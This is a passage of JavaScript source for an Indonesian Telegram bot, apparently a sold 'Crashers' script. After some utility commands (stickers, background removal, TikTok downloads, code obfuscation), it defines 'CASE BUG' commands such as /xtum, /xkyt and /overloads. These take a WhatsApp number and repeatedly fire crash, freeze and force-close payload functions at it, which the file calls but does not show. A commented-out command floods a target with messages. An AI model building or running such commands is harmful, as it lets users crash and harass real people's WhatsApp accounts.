  const cmd = args[1]?.toLowerCase();

  if (!cmd) return ctx.reply("❌ Contoh: /cmdaktif core janggan /core");

  const data = loadCmdMode();
  const disabled = data?.disabled || [];

  if (!disabled.includes(cmd)) {
    return ctx.reply(`⚠️ Command /${cmd} sudah aktif`);
  }

  data.disabled = disabled.filter(c => c !== cmd);
  saveCmdMode(data);

  ctx.reply(`✅ Command /${cmd} berhasil diaktifkan`);
});

bot.command("nonaktifcmd", checkAdmin, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const cmd = args[1]?.toLowerCase();

  if (!cmd) return ctx.reply("❌ Contoh: /nonaktifcmd core janggan /core");

  const data = loadCmdMode();
  const disabled = data?.disabled || [];

  if (disabled.includes(cmd)) {
    return ctx.reply(`⚠️ Command /${cmd} sudah nonaktif`);
  }

  disabled.push(cmd);

  data.disabled = disabled;
  saveCmdMode(data);

  ctx.reply(`⛔ Command /${cmd} berhasil dinonaktifkan`);
});
//// Tools ///
/*bot.command("bratvid", async (ctx) => {
  const chatId = ctx.chat.id;

  
  const text = ctx.message.text
    .split(" ")
    .slice(1)
    .join(" ")
    .trim();

  
  if (!text) {
    return ctx.reply(
      "⚠️ Contoh:\n/bratvid woi kontol"
    );
  }

  
  await ctx.reply(
    "🎬 Lagi bikin sticker videonya bre..."
  );

  try {
   
    const res = await fetch(
      `https://api.zenzxz.my.id/maker/bratvid?text=${encodeURIComponent(
        text
      )}`
    );

   
    if (!res.ok) {
      throw new Error(
        `HTTP error ${res.status}`
      );
    }

  
    const buffer = Buffer.from(
      await res.arrayBuffer()
    );

  
    const tmpFile = path.join(
      __dirname,
      `bratvid_${Date.now()}.webm`
    );

    fs.writeFileSync(
      tmpFile,
      buffer
    );

  
    await ctx.replyWithSticker(
      {
        source: tmpFile
      }
    );

  
    fs.unlinkSync(
      tmpFile
    );

  } catch (e) {
    console.error(
      "BRATVID ERROR:",
      e
    );

    return ctx.reply(
      "❌ Gagal generate sticker video."
    );
  }
});

bot.command("removebg", async (ctx) => {
  const chatId = ctx.chat.id;

 
  if (
    !ctx.message.reply_to_message ||
    !ctx.message.reply_to_message.photo
  ) {
    return ctx.reply(
      "📸 *Silakan reply foto yang ingin dihapus background-nya.*",
      {
        parse_mode: "Markdown"
      }
    );
  }

  try {
    await ctx.reply("⏳ Sedang menghapus background...");

   
    const photo =
      ctx.message.reply_to_message.photo[
        ctx.message.reply_to_message.photo.length - 1
      ];

  
    const fileLink = await ctx.telegram.getFileLink(photo.file_id);

   
    const imageResponse = await axios.get(fileLink.href, {
      responseType: "arraybuffer"
    });

  
    const formData = new FormData();
    formData.append("size", "auto");
    formData.append(
      "image_file",
      Buffer.from(imageResponse.data),
      "image.jpg"
    );

  
    const response = await axios.post(
      "https://api.remove.bg/v1.0/removebg",
      formData,
      {
        headers: {
          ...formData.getHeaders(),
          "X-Api-Key": REMOVE_BG_KEY
        },
        responseType: "arraybuffer"
      }
    );

   
    const filePath = `./removebg_${chatId}.png`;
    fs.writeFileSync(filePath, response.data);

   
    await ctx.replyWithPhoto(
      { source: filePath },
      {
        caption: "✨ Background berhasil dihapus!"
      }
    );

  
    fs.unlinkSync(filePath);

  } catch (error) {
    console.error(
      "REMOVEBG ERROR:",
      error.response?.data?.toString() || error.message
    );

    return ctx.reply(
      `❌ Gagal remove background:\n${
        error.response?.data?.toString() || error.message
      }`
    );
  }
});

bot.command("livejam", async (ctx) => {
  const chatId = ctx.chat.id;


  if (liveIntervals[chatId]) {
    clearInterval(liveIntervals[chatId]);
  }

  const msg = await ctx.reply(getTimeIndonesia());

  liveIntervals[chatId] = setInterval(async () => {
    try {
      await ctx.telegram.editMessageText(
        chatId,
        msg.message_id,
        null,
        getTimeIndonesia()
      );
    } catch (e) {
      clearInterval(liveIntervals[chatId]);
      delete liveIntervals[chatId];
    }
  }, 3000); 
});

bot.command("stopjam", (ctx) => {
  const chatId = ctx.chat.id;

  if (liveIntervals[chatId]) {
    clearInterval(liveIntervals[chatId]);
    delete liveIntervals[chatId];
    ctx.reply("⛔ Live clock dihentikan");
  } else {
    ctx.reply("❌ Tidak ada live clock yang aktif");
  }
});

bot.command("listharga", (ctx) => {
  ctx.reply(`
<pre>💰 LIST HARGA TITLE ATOMIC

━━━━━━━━━━━━━━━
5K NO UPDATE
10K FULL UPADATE 
15K RESELLER SC 
25K PATNER SC
35K OWNER SC
45K MODERATOR SC
━━━━━━━━━━━━━━━
Order: @seanoffc
</pre>`, { parse_mode: "HTML" });
});

bot.command("ssiphone", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" "); 

  if (!text) {
    return ctx.reply(
      "❌ Format: /ssiphone 18:00|40|Indosat|can5y",
      { parse_mode: "Markdown" }
    );
  }


  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return ctx.reply(
      "❌ Format: /ssiphone 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  await ctx.reply("⏳ Wait a moment...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return ctx.reply("❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `✅ Ss Iphone By Atomic Crashers ( 🕷️ )`,
      parse_mode: "Markdown"
    });
  } catch (e) {
    console.error(e);
    ctx.reply(" Terjadi kesalahan saat menghubungi API.");
  }
});

bot.command("cekidch", async (ctx) => {
  const input = ctx.message.text.split(" ")[1];
  if (!input) return ctx.reply("Masukkan username channel.\nContoh: /cekidch @namachannel");

  try {
    const chat = await ctx.telegram.getChat(input);
    ctx.reply(`📢 ID Channel:\n${chat.id}`);
  } catch {
    ctx.reply("Channel tidak ditemukan atau bot belum menjadi admin.");
  }
});

bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("❌ Masukkan teks!");

  try {
    const apiURL = `https://api.zenzxz.my.id/maker/brat?text=${encodeURIComponent(text)}`;

    const res = await axios.get(apiURL, { responseType: "arraybuffer" });

    await ctx.replyWithSticker({
      source: Buffer.from(res.data)
    });

  } catch (e) {
    console.error("Error:", e.message);
    ctx.reply("❌ API error / tidak tersedia.");
  }
});

bot.command("tiktokdl", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("❌ Format: /tiktokdl https://vt.tiktok.com/ZSUeF1CqC/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("⏳ Sedang memproses video");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/ID Safari/537.36",
        "accept": "application/json,text/plain,",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return ctx.reply("❌ Gagal ambil data video pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = await Promise.all(
        imgs.map(async (img) => {
          const res = await axios.get(img, { responseType: "arraybuffer" });
          return {
            type: "photo",
            media: { source: Buffer.from(res.data) }
          };
        })
      );
      await ctx.replyWithMediaGroup(media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl) return ctx.reply("❌ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/ID Safari/537.36"
      },
      timeout: 30000
    });

    await ctx.replyWithVideo(
      { source: Buffer.from(video.data), filename: `${d.id || Date.now()}.mp4` },
      { supports_streaming: true }
    );
  } catch (e) {
    const err =
      e?.response?.status
        ? `❌ Error ${e.response.status} saat mengunduh video`
        : "❌ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try {
      await ctx.deleteMessage(wait.message_id);
    } catch {}
  }
});

bot.command("convert", checkAllPremium, async (ctx) => {
  const r = ctx.message.reply_to_message;
  if (!r) return ctx.reply("❌ Format: /convert ( reply dengan foto/video )");

  let fileId = null;
  if (r.photo && r.photo.length) {
    fileId = r.photo[r.photo.length - 1].file_id;
  } else if (r.video) {
    fileId = r.video.file_id;
  } else if (r.video_note) {
    fileId = r.video_note.file_id;
  } else {
    return ctx.reply("❌ Hanya mendukung foto atau video");
  }

  const wait = await ctx.reply("⏳ Mengambil file & mengunggah ke catbox");

  try {
    const tgLink = String(await ctx.telegram.getFileLink(fileId));

    const params = new URLSearchParams();
    params.append("reqtype", "urlupload");
    params.append("url", tgLink);

    const { data } = await axios.post("https://catbox.moe/user/api.php", params, {
      headers: { "content-type": "application/x-www-form-urlencoded" },
      timeout: 30000
    });

    if (typeof data === "string" && /^https?:\/\/files\.catbox\.moe\//i.test(data.trim())) {
      await ctx.reply(data.trim());
    } else {
      await ctx.reply("❌ Gagal upload ke catbox" + String(data).slice(0, 200));
    }
  } catch (e) {
    const msg = e?.response?.status
      ? `❌ Error ${e.response.status} saat unggah ke catbox`
      : "❌ Gagal unggah coba lagi.";
    await ctx.reply(msg);
  } finally {
    try { await ctx.deleteMessage(wait.message_id); } catch {}
  }
});

bot.command("enc", async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;

    if (!reply || !reply.document) {
      return ctx.reply("❌ Reply file .js dengan command /enc");
    }

    const doc = reply.document;

    if (!doc.file_name.endsWith(".js")) {
      return ctx.reply("❌ File harus JavaScript (.js)");
    }

    const file = await ctx.telegram.getFile(doc.file_id);
    const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;

    const res = await axios.get(fileUrl);
    let code = res.data;

    if (!code || code.length < 5) {
      return ctx.reply("❌ File kosong / tidak valid");
    }

    await ctx.reply("🔐 Encrypt aman sedang berjalan...");

  
    code = `/ Protected Script - ${ctx.from.first_name} /\n` + code;

    const obf = JavaScriptObfuscator.obfuscate(code, {
      compact: true,
      controlFlowFlattening: false,
      deadCodeInjection: false,
      debugProtection: false,
      disableConsoleOutput: true,
      stringArray: true,
      stringArrayEncoding: ["base64"],
      stringArrayThreshold: 0.75,
      stringArrayShuffle: true,
      splitStrings: true,
      splitStringsChunkLength: 5
    });

    const result = obf.getObfuscatedCode();

    await ctx.replyWithDocument({
      source: Buffer.from(result, "utf8"),
      filename: "enc_safe.js"
    }, {
      caption: "✅ Encrypt berhasil (reply mode)\n🔒 Stabil & Aman"
    });

  } catch (err) {
    console.log(err);
    ctx.reply("❌ Gagal encrypt");
  }
});

bot.command("rasukbot", async (ctx) => {
  const chatId = ctx.chat.id;
  const text = ctx.message.text;
  const args = text.split(" ").slice(1).join(" ").trim();
  const reply = ctx.message.reply_to_message;

  if (!args) {
    return ctx.reply(
      "📘 <b>Cara penggunaan /rasukbot</b>\n\n" +
      "🟢 <b>1. Kirim langsung (tanpa reply)</b>\n" +
      "Gunakan format:\n<code>/rasukbot token|id|pesan|jumlah</code>\n\n" +
      "Contoh:\n<code>/rasukbot 123456:ABCDEF|987654321|Halo bro|5</code>\n\n" +
      "🔵 <b>2. Balas pesan target</b>\n" +
      "Balas pesan orangnya, lalu ketik:\n<code>/rasukbot token|pesan|jumlah</code>\n\n" +
      "Contoh:\n<code>/rasukbot 123456:ABCDEF|Halo|3</code>",
      { parse_mode: "HTML" }
    );
  }

  try {
    let token, targetId, pesan, jumlah;

    if (reply) {
      const parts = args.split("|").map(x => x.trim());
      if (parts.length < 3) {
        return ctx.reply(
          "❌ Format salah!\nGunakan: <code>/rasukbot token|pesan|jumlah</code> (balas pesan target)",
          { parse_mode: "HTML" }
        );
      }

      [token, pesan, jumlah] = parts;
      targetId = reply.from.id;
      jumlah = parseInt(jumlah);

    } else {

      if (!args.includes("|")) {
        return ctx.reply(
          "📩 Format salah!\n\nGunakan format:\n" +
          "<code>/rasukbot token|id|pesan|jumlah</code>\n\n" +
          "Contoh:\n<code>/rasukbot 123456:ABCDEF|987654321|Halo bro|5</code>",
          { parse_mode: "HTML" }
        );
      }

      const parts = args.split("|").map(x => x.trim());
      [token, targetId, pesan, jumlah] = parts;
      jumlah = parseInt(jumlah);
    }

    if (!token || !targetId || !pesan || isNaN(jumlah)) {
      return ctx.reply(
        "❌ Format salah!\nGunakan: <code>/rasukbot token|id|pesan|jumlah</code>",
        { parse_mode: "HTML" }
      );
    }

    await ctx.reply("🚀 Mengirim pesan...");

    for (let i = 1; i <= jumlah; i++) {
      await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
        chat_id: targetId,
        text: pesan
      });
    }

    await ctx.reply(
      `✅ Berhasil mengirim ${jumlah} pesan ke ID <code>${targetId}</code>`,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    await ctx.reply(
      `❌ Gagal mengirim pesan:\n<code>${err.message}</code>`,
      { parse_mode: "HTML" }
    );
  }
});/**/

bot.command("cekid", async (ctx) => {
  try {
    let target = ctx.from;

   
    if (ctx.message.reply_to_message) {
      target = ctx.message.reply_to_message.from;
    }

    const userId = target.id;
    const firstName = target.first_name || "-";
    const lastName = target.last_name || "";
    const username = target.username ? `@${target.username}` : "Tidak ada username";
    const fullName = `${firstName} ${lastName}`.trim();

    const teks = `
<blockquote><strong>「 CEK USER ID 」</strong></blockquote>
👤 Nama: ${fullName}
🆔 ID: <code>${userId}</code>
🔗 Username: ${username}
💬 Chat ID: <code>${ctx.chat.id}</code>
    `;

    await ctx.reply(teks, {
      parse_mode: "HTML"
    });

  } catch (e) {
    console.error("CEKID ERROR:", e);

    await ctx.reply(
      `❌ Error saat cek ID\n${e.message}`
    );
  }
});
/// Connect ////
bot.command("connect", checkOwner, async (ctx) => {
  try {
    if (!sock) {
      return ctx.reply("❌ Socket belum siap. Restart bot dulu.");
    }

    if (isWhatsAppConnected && sock.user) {
      return ctx.reply("✅ WhatsApp sudah terhubung.");
    }

    if (global.pairingMessage) {
      return ctx.reply("⚠️ Pairing masih aktif, tunggu dulu.");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
      return ctx.reply("Example:\n/connect 628xxxx");
    }

    let phoneNumber = args[1].replace(/[^0-9]/g, "");

    
    if (phoneNumber.startsWith("08")) {
      phoneNumber = "62" + phoneNumber.slice(1);
    }

    
    if (phoneNumber.length < 8 || phoneNumber.length > 15) {
      return ctx.reply("❌ Nomor tidak valid.\nGunakan kode negara.\n\nExample:\n/connect 628xxxx");
    }

    await new Promise(r => setTimeout(r, 1000));

    const code = await sock.requestPairingCode(phoneNumber);
    if (!code) return ctx.reply("❌ Gagal ambil pairing code.");

    const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

    const msg = await ctx.replyWithPhoto(
      "https://files.catbox.moe/ep7tzw.jpg",//ganti jadi url catbox gambar lu
      {
        caption:
`<pre>⬡═―⊱「 𝘡𝘷𝘹 𝑪𝒓𝒂𝒔𝒉𝒆𝒓𝒔 」⊰―═⬡
       
  ⬡═―⊱〔 REQUEST PAIRING 〕⊰―═⬡
ϟ  Nomor  : ${phoneNumber}
ϟ  Kode   : ${formattedCode}
ϟ  Note  : KALO GAGAL PAIR HAPUS SENSASION 

ϟ  🟡 Status : Waiting for connection...
</pre>`,
        parse_mode: "HTML"
      }
    );

    global.pairingMessage = {
      chatId: msg.chat.id,
      messageId: msg.message_id
    };

    setTimeout(() => {
      global.pairingMessage = null;
    }, 60000);

  } catch (err) {
    console.log("Pairing error FULL:", err);
    global.pairingMessage = null;
    ctx.reply("❌ Gagal pairing!");
  }
});

/// ------ Kill Sesi -------- ///
bot.command("killsesi", checkOwner, async (ctx) => {
  try {
    if (sock) {
      try {
        await sock.logout();
      } catch {}
      sock = null;
    }

    const deleted = deleteSession();
    global.pairingMessage = null;

    if (deleted) {
      ctx.reply("🗑️ Session dihapus, silakan /connect ulang");
    } else {
      ctx.reply("⚠️ Session tidak ditemukan");
    }

  } catch (err) {
    console.log(err);
    ctx.reply("❌ Gagal hapus session");
  }
});
/// CASE BUG ///
bot.command("xtum", checkAllPremium, checkWhatsAppConnection, async (ctx) => {

  const text = ctx.message?.text || "";
  const q = text.split(" ")[1];

  if (!q) return ctx.reply("🪧 ☇ Example : /xtum 62xx");

  const cleanNumber = q.replace(/[^0-9]/g, "");
  if (!cleanNumber) return ctx.reply("❌ Nomor tidak valid");

  const target = cleanNumber + "@s.whatsapp.net";

  await ctx.reply(
`✘ 𝚂𝚄𝙲𝙲𝙴𝚂𝚂 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ Success Terkirim : ${q}
♛ Status    : Bug Terkirim`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "☛ CEK TARGET ☚",
              url: `https://wa.me/${cleanNumber}`,
              style: "success",
              icon_custom_emoji_id: "4958642964181025908"
            }
          ],
        ]
      }
    }
  );

  (async () => {
    for (let i = 0; i < 25; i++) {
      await VnXNewDenglayInpisCuy(sock, target);
      await sleep(700);
      await ComboRapiPoll(sock, target)
      await sleep(750);
    }
  })();

});
/// CASE BUG ///
bot.command("core", checkAllPremium, checkWhatsAppConnection, async (ctx) => {

  const text = ctx.message?.text || "";
  const q = text.split(" ")[1];

  if (!q) return ctx.reply("🪧 ☇ Example : /core 62xx");

  const cleanNumber = q.replace(/[^0-9]/g, "");
  if (!cleanNumber) return ctx.reply("❌ Nomor tidak valid");

  const target = cleanNumber + "@s.whatsapp.net";

  await ctx.reply(
`✘ 𝚂𝚄𝙲𝙲𝙴𝚂 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ Success Terkirim : ${q}
♛ Status    : Bug Terkirim`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "☛ CEK TARGET ☚",
              url: `https://wa.me/${cleanNumber}`,
              style: "success",
              icon_custom_emoji_id: "4958642964181025908"
            }
          ],
        ]
      }
    }
  );

  (async () => {
    for (let i = 0; i < 25; i++) {
      await ComboRapiPoll(sock, target);
      await sleep(800);
      await VnXNewDenglayInpisCuy(sock, target);
      await sleep(800);
    }
  })();

});
/// CASE BUG ///
bot.command("Xvlod", checkAllPremium, checkWhatsAppConnection, async (ctx) => {

  const text = ctx.message?.text || "";
  const q = text.split(" ")[1];

  if (!q) return ctx.reply("🪧 ☇ Example : /Xvlod 62xx");

  const cleanNumber = q.replace(/[^0-9]/g, "");
  if (!cleanNumber) return ctx.reply("❌ Nomor tidak valid");

  const target = cleanNumber + "@s.whatsapp.net";

  await ctx.reply(
`✘ 𝚂𝚄𝙲𝙲𝙴𝚂 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ Success Terkirim : ${q}
♛ Status    : Bug Terkirim`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "☛ CEK TARGET ☚",
              url: `https://wa.me/${cleanNumber}`,
              style: "success",
              icon_custom_emoji_id: "4958642964181025908"
            }
          ],
        ]
      }
    }
  );

  (async () => {
    for (let i = 0; i < 140; i++) {
      await delayhard(sock, target);
      await sleep(1000);
    }
  })();

});
/// CASE BUG ///
bot.command("xbrt", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("🪧 ☇ Example : /xbrt 62xx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const prosesText = `<blockquote><strong>𝐏𝐑𝐎𝐒𝐄𝐒 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /xbrt
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Process
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : Freze cht new
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : ??% ban
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : zalindra Script`;

    const successText = `<blockquote><strong>𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /xbrt
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Success
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : Freze chat new
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : ??% ban
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : zalindra Crashers Script`;

    const msg = await ctx.replyWithPhoto(
      { source: fs.readFileSync("./image/AtomicCrashers.jpg") },
      {
        caption: prosesText,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 60; i++) {
      await VnXNewChatLock(sock, target);
        await new Promise(r => setTimeout(r, 1000));
      await VnXNewfrezeeHard(sock, target);
        await new Promise(r => setTimeout(r, 1000));
      }
    })();

    setTimeout(async () => {
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          msg.message_id,
          null,
          successText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
              ]
            }
          }
        );
      } catch (e) {
        console.log("Edit error:", e.message);
      }
    }, 4000);

  } catch (err) {
    console.log("Xall error:", err.message);
  }
});
/// CASE BUG ///

bot.command("xkyt", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("🪧 ☇ Example : /xkyt 62xx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const prosesText = `<blockquote><strong>𝐏𝐑𝐎𝐒𝐄𝐒 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /xkyt
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Process
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : Forcelose x blank
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : 95% ban
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : zalindra Script`;

    const successText = `<blockquote><strong>𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /xkyt
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Success
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : Forclose X blank
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : 95% ban
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : zalindra Crashers Script`;

    const msg = await ctx.replyWithPhoto(
      { source: fs.readFileSync("./image/AtomicCrashers.jpg") },
      {
        caption: prosesText,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 55; i++) {
      await VnXForceXBlankNew(sock, target);
        await new Promise(r => setTimeout(r, 1000));
      }
    })();

    setTimeout(async () => {
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          msg.message_id,
          null,
          successText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
              ]
            }
          }
        );
      } catch (e) {
        console.log("Edit error:", e.message);
      }
    }, 4000);

  } catch (err) {
    console.log("Xall error:", err.message);
  }
});

bot.command("overloads", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("🪧 ☇ Example : /overloads 62xx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const prosesText = `<blockquote><strong>𝐏𝐑𝐎𝐒𝐄𝐒 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /overloads
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Process
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : Delay Hard Invis
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : 80% ban
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : zalindra Script`;

    const successText = `<blockquote><strong>𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /overloads 
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Success
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : Delay Hard invis
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : 80% ban
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : zalindra Crashers Script`;

    const msg = await ctx.replyWithPhoto(
      { source: fs.readFileSync("./image/AtomicCrashers.jpg") },
      {
        caption: prosesText,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 55; i++) {
      await ComboBulldozerVnX(sock, target, count = 10);
        await new Promise(r => setTimeout(r, 1000));
      }
    })();

    setTimeout(async () => {
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          msg.message_id,
          null,
          successText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
              ]
            }
          }
        );
      } catch (e) {
        console.log("Edit error:", e.message);
      }
    }, 4000);

  } catch (err) {
    console.log("Xall error:", err.message);
  }
});
/// CASE BUG  ///
bot.command("gloweus", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("🪧 ☇ Example : /gloweus 62xx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const prosesText = `<blockquote><strong>𝐏𝐑𝐎𝐒𝐄𝐒 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /gloweus 
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Process
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : Delay Type Visible
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : 89% ban
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : zalindra Script`;

    const successText = `<blockquote><strong>𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /gloweus 
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Success
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : Delay Type Visible
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : 89% ban
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : zalindra Crashers Script`;

    const msg = await ctx.replyWithPhoto(
      { source: fs.readFileSync("./image/AtomicCrashers.jpg") },
      {
        caption: prosesText,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 30; i++) {
      await DelayVisibleDocu(sock, target);
        await new Promise(r => setTimeout(r, 1000));
      }
    })();

    setTimeout(async () => {
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          msg.message_id,
          null,
          successText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
              ]
            }
          }
        );
      } catch (e) {
        console.log("Edit error:", e.message);
      }
    }, 4000);

  } catch (err) {
    console.log("Xall error:", err.message);
  }
});
/// CASE BUG ///
